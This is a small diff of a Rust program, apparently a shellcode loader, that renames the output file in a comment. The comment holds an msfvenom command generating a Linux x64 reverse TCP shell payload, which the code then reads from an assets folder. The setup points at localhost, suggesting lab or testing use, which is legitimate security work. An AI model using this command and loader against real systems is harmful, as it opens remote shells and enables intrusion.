@@ -10,7 +10,7 @@ fn main() {
     let cwd = path.display();
 
     // Shellcode:
-    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
+    // msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out linux-x64-shell_reverse_tcp.bin
     let shellcode_path = format!("{}/assets/linux-x64-shell_reverse_tcp.bin", cwd);
 
     let shellcode_bytes = fs::read(shellcode_path).expect("Failed to open file");
